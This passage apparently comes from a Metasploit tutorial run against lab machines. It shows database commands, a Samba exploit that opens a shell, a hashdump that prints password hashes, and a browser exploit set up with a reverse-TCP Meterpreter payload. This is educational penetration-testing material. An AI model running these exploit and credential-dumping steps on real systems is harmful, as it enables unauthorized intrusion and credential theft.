</span><span class='line'>    -t &lt;opt&gt;  The output format: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-net,psh-reflection,psh-cmd,vba,vba-exe,vba-psh,vbs,war
</span><span class='line'>    -x &lt;opt&gt;  The executable template to use</span></code></pre></td></tr></table></div></figure>


<h1>Working with the database</h1>

<p>Metasploit is backed by a powerful database that you can use to organize and classify the information. First, you have to start the PostgreSQL server: <code>service postgresql start</code>. Then you create and initialize the database after starting Metasploit with the <code>msfdb init</code> command.</p>

<p>Let&rsquo;s look at the database commands:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Database Backend Commands
</span><span class='line'>=========================
</span><span class='line'>
</span><span class='line'>    Command           Description
</span><span class='line'>    -------           -----------
</span><span class='line'>    creds             List all credentials in the database
</span><span class='line'>    db_connect        Connect to an existing database
</span><span class='line'>    db_disconnect     Disconnect from the current database instance
</span><span class='line'>    db_export         Export a file containing the contents of the database
</span><span class='line'>    db_import         Import a scan result file (filetype will be auto-detected)
</span><span class='line'>    db_nmap           Executes nmap and records the output automatically
</span><span class='line'>    db_rebuild_cache  Rebuilds the database-stored module cache
</span><span class='line'>    db_status         Show the current database status
</span><span class='line'>    hosts             List all hosts in the database
</span><span class='line'>    loot              List all loot in the database
</span><span class='line'>    notes             List all notes in the database
</span><span class='line'>    services          List all services in the database
</span><span class='line'>    vulns             List all vulnerabilities in the database
</span><span class='line'>    workspace         Switch between database workspaces</span></code></pre></td></tr></table></div></figure>


<p>Chances are, you will want to keep your targets organized and separate from each other. For this, you can build different workspaces for every one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help workspace
</span><span class='line'>Usage:
</span><span class='line'>    workspace                  List workspaces
</span><span class='line'>    workspace [name]           Switch workspace
</span><span class='line'>    workspace -a [name] ...    Add workspace(s)
</span><span class='line'>    workspace -d [name] ...    Delete workspace(s)
</span><span class='line'>    workspace -D               Delete all workspaces
</span><span class='line'>    workspace -r &lt;old&gt; &lt;new&gt;   Rename workspace
</span><span class='line'>    workspace -h               Show this help information</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s say that you want a separate workspace for your lab target. You can add it and all the subsequent information will be saved in this workspace:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; workspace -a lab
</span><span class='line'>[*] Added workspace: lab
</span><span class='line'>msf &gt; workspace
</span><span class='line'>  default
</span><span class='line'>* lab</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s populate this workspace with some information about the target. I ran a <code>db_nmap</code> scan on the box and then I looked at the hosts data:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; hosts
</span><span class='line'>
</span><span class='line'>Hosts
</span><span class='line'>=====
</span><span class='line'>
</span><span class='line'>address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
</span><span class='line'>-------         ---                ----  -------  ---------  -----  -------  ----  --------
</span><span class='line'>192.168.80.156  00:0c:29:e5:3a:67        Linux               2.6.X  server         </span></code></pre></td></tr></table></div></figure>


<p>There is more that you can do with the <strong>hosts</strong> command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; hosts -h
</span><span class='line'>Usage: hosts [ options ] [addr1 addr2 ...]
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>  -a,--add          Add the hosts instead of searching
</span><span class='line'>  -d,--delete       Delete the hosts instead of searching
</span><span class='line'>  -c &lt;col1,col2&gt;    Only show the given columns (see list below)
</span><span class='line'>  -h,--help         Show this help information
</span><span class='line'>  -u,--up           Only show hosts which are up
</span><span class='line'>  -o &lt;file&gt;         Send output to a file in csv format
</span><span class='line'>  -R,--rhosts       Set RHOSTS from the results of the search
</span><span class='line'>  -S,--search       Search string to filter by
</span><span class='line'>  -i,--info         Change the info of a host
</span><span class='line'>  -n,--name         Change the name of a host
</span><span class='line'>  -m,--comment      Change the comment of a host
</span><span class='line'>  -t,--tag          Add or specify a tag to a range of hosts
</span><span class='line'>
</span><span class='line'>Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags</span></code></pre></td></tr></table></div></figure>


<p>With the <strong>services</strong> command, you can look at the identified services:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; services -h
</span><span class='line'>
</span><span class='line'>Usage: services [-h] [-u] [-a] [-r &lt;proto&gt;] [-p &lt;port1,port2&gt;] [-s &lt;name1,name2&gt;] [-o &lt;filename&gt;] [addr1 addr2 ...]
</span><span class='line'>
</span><span class='line'>  -a,--add          Add the services instead of searching
</span><span class='line'>  -d,--delete       Delete the services instead of searching
</span><span class='line'>  -c &lt;col1,col2&gt;    Only show the given columns
</span><span class='line'>  -h,--help         Show this help information
</span><span class='line'>  -s &lt;name1,name2&gt;  Search for a list of service names
</span><span class='line'>  -p &lt;port1,port2&gt;  Search for a list of ports
</span><span class='line'>  -r &lt;protocol&gt;     Only show [tcp|udp] services
</span><span class='line'>  -u,--up           Only show services which are up
</span><span class='line'>  -o &lt;file&gt;         Send output to a file in csv format
</span><span class='line'>  -R,--rhosts       Set RHOSTS from the results of the search
</span><span class='line'>  -S,--search       Search string to filter by
</span><span class='line'>
</span><span class='line'>Available columns: created_at, info, name, port, proto, state, updated_at
</span><span class='line'>
</span><span class='line'>msf &gt; services
</span><span class='line'>
</span><span class='line'>Services
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>host            port  proto  name         state  info
</span><span class='line'>----            ----  -----  ----         -----  ----
</span><span class='line'>192.168.80.156  21    tcp    ftp          open   ProFTPD 1.3.1
</span><span class='line'>192.168.80.156  22    tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0
</span><span class='line'>192.168.80.156  23    tcp    telnet       open   Linux telnetd
</span><span class='line'>192.168.80.156  25    tcp    smtp         open   Postfix smtpd
</span><span class='line'>192.168.80.156  53    tcp    domain       open   ISC BIND 9.4.2
</span><span class='line'>192.168.80.156  80    tcp    http         open   Apache httpd 2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
</span><span class='line'>192.168.80.156  139   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
</span><span class='line'>192.168.80.156  445   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
</span><span class='line'>192.168.80.156  3306  tcp    mysql        open   MySQL 5.0.51a-3ubuntu5
</span><span class='line'>192.168.80.156  5432  tcp    postgresql   open   PostgreSQL DB 8.3.0 - 8.3.7
</span><span class='line'>192.168.80.156  8009  tcp    ajp13        open   Apache Jserv Protocol v1.3
</span><span class='line'>192.168.80.156  8180  tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1</span></code></pre></td></tr></table></div></figure>


<p>You can also look at the vulnerabilities associated with different services:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help vulns
</span><span class='line'>Print all vulnerabilities in the database
</span><span class='line'>
</span><span class='line'>Usage: vulns [addr range]
</span><span class='line'>
</span><span class='line'>  -h,--help             Show this help information
</span><span class='line'>  -p,--port &lt;portspec&gt;  List vulns matching this port spec
</span><span class='line'>  -s &lt;svc names&gt;        List vulns matching these service names
</span><span class='line'>  -R,--rhosts           Set RHOSTS from the results of the search
</span><span class='line'>  -S,--search           Search string to filter by
</span><span class='line'>  -i,--info             Display Vuln Info
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  vulns -p 1-65536          # only vulns with associated services
</span><span class='line'>  vulns -p 1-65536 -s http  # identified as http on any port</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s possible to also add notes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help notes
</span><span class='line'>Usage: notes [-h] [-t &lt;type1,type2&gt;] [-n &lt;data string&gt;] [-a] [addr range]
</span><span class='line'>
</span><span class='line'>  -a,--add                  Add a note to the list of addresses, instead of listing
</span><span class='line'>  -d,--delete               Delete the hosts instead of searching
</span><span class='line'>  -n,--note &lt;data&gt;          Set the data for a new note (only with -a)
</span><span class='line'>  -t &lt;type1,type2&gt;          Search for a list of types
</span><span class='line'>  -h,--help                 Show this help information
</span><span class='line'>  -R,--rhosts               Set RHOSTS from the results of the search
</span><span class='line'>  -S,--search               Regular expression to match for search
</span><span class='line'>  -o,--output               Save the notes to a csv file
</span><span class='line'>  --sort &lt;field1,field2&gt;    Fields to sort by (case sensitive)
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  notes --add -t apps -n 'winzip' 10.1.1.34 10.1.20.41
</span><span class='line'>  notes -t smb.fingerprint 10.1.1.34 10.1.20.41
</span><span class='line'>  notes -S 'nmap.nse.(http|rtsp)' --sort type,output</span></code></pre></td></tr></table></div></figure>


<p>If credentials were found, we have a way to list and manage them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help creds
</span><span class='line'>
</span><span class='line'>With no sub-command, list credentials. If an address range is
</span><span class='line'>given, show only credentials with logins on hosts within that
</span><span class='line'>range.
</span><span class='line'>
</span><span class='line'>Usage - Listing credentials:
</span><span class='line'>  creds [filter options] [address range]
</span><span class='line'>
</span><span class='line'>Usage - Adding credentials:
</span><span class='line'>  creds add-ntlm &lt;user&gt; &lt;ntlm hash&gt; [domain]
</span><span class='line'>  creds add-password &lt;user&gt; &lt;password&gt; [realm] [realm-type]
</span><span class='line'>  creds add-ssh-key &lt;user&gt; &lt;/path/to/id_rsa&gt; [realm-type]
</span><span class='line'>Where [realm type] can be one of:
</span><span class='line'>  domain - Active Directory Domain
</span><span class='line'>  db2db - DB2 Database
</span><span class='line'>  sid - Oracle System Identifier
</span><span class='line'>  pgdb - PostgreSQL Database
</span><span class='line'>  wildcard - *
</span><span class='line'>
</span><span class='line'>General options
</span><span class='line'>  -h,--help             Show this help information
</span><span class='line'>  -o &lt;file&gt;             Send output to a file in csv format
</span><span class='line'>  -d                    Delete one or more credentials
</span><span class='line'>
</span><span class='line'>Filter options for listing
</span><span class='line'>  -P,--password &lt;regex&gt; List passwords that match this regex
</span><span class='line'>  -p,--port &lt;portspec&gt;  List creds with logins on services matching this port spec
</span><span class='line'>  -s &lt;svc names&gt;        List creds matching comma-separated service names
</span><span class='line'>  -u,--user &lt;regex&gt;     List users that match this regex
</span><span class='line'>  -t,--type &lt;type&gt;      List creds that match the following types: password,ntlm,hash
</span><span class='line'>  -O,--origins          List creds that match these origins
</span><span class='line'>  -R,--rhosts           Set RHOSTS from the results of the search
</span><span class='line'>
</span><span class='line'>Examples, listing:
</span><span class='line'>  creds               # Default, returns all credentials
</span><span class='line'>  creds 1.2.3.4/24    # nmap host specification
</span><span class='line'>  creds -p 22-25,445  # nmap port specification
</span><span class='line'>  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services
</span><span class='line'>  creds -t ntlm       # All NTLM creds
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Examples, adding:
</span><span class='line'>  # Add a user with an NTLMHash
</span><span class='line'>  creds add-ntlm alice 5cfe4c82d9ab8c66590f5b47cd6690f1:978a2e2e1dec9804c6b936f254727f9a
</span><span class='line'>  # Add a user with a blank password and a domain
</span><span class='line'>  creds add-password bob '' contosso
</span><span class='line'>  # Add a user with an SSH key
</span><span class='line'>  creds add-ssh-key root /root/.ssh/id_rsa
</span><span class='line'>
</span><span class='line'>Example, deleting:
</span><span class='line'>  # Delete all SMB credentials
</span><span class='line'>  creds -d -s smb</span></code></pre></td></tr></table></div></figure>


<p>As you can see though, I have no credentials in the database:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; creds
</span><span class='line'>Credentials
</span><span class='line'>===========
</span><span class='line'>
</span><span class='line'>host  origin  service  public  private  realm  private_type
</span><span class='line'>----  ------  -------  ------  -------  -----  ------------</span></code></pre></td></tr></table></div></figure>


<p>Finally, there is the loot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help loot
</span><span class='line'>Usage: loot &lt;options&gt;
</span><span class='line'> Info: loot [-h] [addr1 addr2 ...] [-t &lt;type1,type2&gt;]
</span><span class='line'>  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] [-t [type]
</span><span class='line'>  Del: loot -d [addr1 addr2 ...]
</span><span class='line'>
</span><span class='line'>  -a,--add          Add loot to the list of addresses, instead of listing
</span><span class='line'>  -d,--delete       Delete *all* loot matching host and type
</span><span class='line'>  -f,--file         File with contents of the loot to add
</span><span class='line'>  -i,--info         Info of the loot to add
</span><span class='line'>  -t &lt;type1,type2&gt;  Search for a list of types
</span><span class='line'>  -h,--help         Show this help information
</span><span class='line'>  -S,--search       Search string to filter by</span></code></pre></td></tr></table></div></figure>


<p>I have compromised the target via the Samba service and now I will loot some hashes from it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; run -j
</span><span class='line'>[*] Exploit running as background job.
</span><span class='line'>
</span><span class='line'>[*] Started bind handler
</span><span class='line'>msf exploit(usermap_script) &gt; [*] Command shell session 2 opened (192.168.80.155:49009 -&gt; 192.168.80.156:4444) at 2016-06-03 13:19:48 -0400
</span><span class='line'>
</span><span class='line'>msf exploit(usermap_script) &gt; use post/linux/gather/hashdump
</span><span class='line'>msf post(hashdump) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (post/linux/gather/hashdump):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   SESSION                   yes       The session to run this module on.
</span><span class='line'>
</span><span class='line'>msf post(hashdump) &gt; sessions
</span><span class='line'>
</span><span class='line'>Active sessions
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>  Id  Type        Information  Connection
</span><span class='line'>  --  ----        -----------  ----------
</span><span class='line'>  2   shell unix               192.168.80.155:49009 -&gt; 192.168.80.156:4444 (192.168.80.156)
</span><span class='line'>
</span><span class='line'>msf post(hashdump) &gt; set SESSION 2
</span><span class='line'>SESSION =&gt; 2
</span><span class='line'>msf post(hashdump) &gt; run
</span><span class='line'>
</span><span class='line'>[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
</span><span class='line'>[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
</span><span class='line'>[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
</span><span class='line'>[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
</span><span class='line'>[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
</span><span class='line'>[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
</span><span class='line'>[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
</span><span class='line'>[+] Unshadowed Password File: /root/.msf5/loot/20160603132136_lab_192.168.80.156_linux.hashes_520578.txt
</span><span class='line'>[*] Post module execution completed</span></code></pre></td></tr></table></div></figure>


<p>Now I can see the loot in the database:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf post(hashdump) &gt; loot
</span><span class='line'>
</span><span class='line'>Loot
</span><span class='line'>====
</span><span class='line'>
</span><span class='line'>host            service  type          name                   content     info                            path
</span><span class='line'>----            -------  ----          ----                   -------     ----                            ----
</span><span class='line'>192.168.80.156           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf5/loot/20160603132136_lab_192.168.80.156_linux.hashes_520578.txt
</span><span class='line'>192.168.80.156           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf5/loot/20160603132135_lab_192.168.80.156_linux.passwd_153460.txt
</span><span class='line'>192.168.80.156           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf5/loot/20160603132135_lab_192.168.80.156_linux.shadow_842643.txt</span></code></pre></td></tr></table></div></figure>


<h1>Meterpreter</h1>

<p>Next, let&rsquo;s look at Meterpreter, the king of payloads. Meterpreter has no disk presence because it only exists in memory, and it leaves no trail behind of created processes because it injects itself in currently running processes. To top it off, its traffic is encrypted. I will show Meterpreter in action here, but this time, the target is a Windows 7 machine.</p>

<p>I&rsquo;ve already set up the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/windows/browser/ms11_003_ie_css_import):
</span><span class='line'>
</span><span class='line'>   Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   OBFUSCATE  true             no        Enable JavaScript obfuscation
</span><span class='line'>   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
</span><span class='line'>   SRVPORT    8080             yes       The local port to listen on.
</span><span class='line'>   SSL        false            no        Negotiate SSL for incoming connections
</span><span class='line'>   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
</span><span class='line'>   URIPATH                     no        The URI to use for this exploit (default is random)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (windows/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>   LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>   LPORT     4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic</span></code></pre></td></tr></table></div></figure>


<p>And the description of what this exploit does:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Description:
</span><span class='line'>  This module exploits a memory corruption vulnerability within 
</span><span class='line'>  Microsoft\'s HTML engine (mshtml). When parsing an HTML page 
</span><span class='line'>  containing a recursive CSS import, a C++ object is deleted and later 
</span><span class='line'>  reused. This leads to arbitrary code execution. This exploit 
</span><span class='line'>  utilizes a combination of heap spraying and the .NET 2.0 
</span><span class='line'>  'mscorie.dll' module to bypass DEP and ASLR. This module does not 
</span><span class='line'>  opt-in to ASLR. As such, this module should be reliable on all 
</span><span class='line'>  Windows versions with .NET 2.0.50727 installed.</span></code></pre></td></tr></table></div></figure>


<p>All right, first I start the handler on my attacking machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; run -j
</span><span class='line'>[*] Exploit running as background job.
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.80.155:4444 
</span><span class='line'>[*] Using URL: http://0.0.0.0:8080/Br8CNFRY
</span><span class='line'>msf exploit(ms11_003_ie_css_import) &gt; [*] Local IP: http://192.168.80.155:8080/Br8CNFRY
</span><span class='line'>[*] Server started.</span></code></pre></td></tr></table></div></figure>


<p>Then on the victim, I disabled WIndows Firewall and then I used Internet Explorer (ugh) to go to the URL <code><a href="http://192.168.80.155:8080/Br8CNFRY">http://192.168.80.155:8080/Br8CNFRY</a></code>. And on my Kali machine, a Meterpreter session was opened:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
